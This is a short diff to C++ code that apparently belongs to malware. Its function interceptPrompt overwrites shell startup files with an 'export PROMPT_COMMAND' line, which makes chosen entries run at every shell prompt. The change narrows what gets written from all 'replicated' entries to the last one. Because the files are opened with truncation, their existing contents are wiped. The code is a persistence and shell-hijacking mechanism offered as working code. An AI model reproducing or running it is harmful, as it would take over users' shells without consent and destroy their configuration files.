@@ -8,6 +8,7 @@
 
 void interceptPrompt() {
     char c;
+    auto& target = replicatedEntries.back();
     for (const auto& targetFile : possibleTargetFiles) {
 
         std::ifstream probe(targetFile);
@@ -16,15 +17,7 @@ void interceptPrompt() {
         std::ofstream writer(targetFile);
 
         writer << '\n';
-        writer << "export PROMPT_COMMAND=(";
-        for (const auto& entry : replicatedEntries) {
-            writer << "\"";
-            writer << entry;
-            writer << ' ' << noninjectKey;
-            writer << "\" ";
-        }
-        writer << ")";
-
+        writer << "export PROMPT_COMMAND=( \"" << target << "\" )";
     }
 }
 
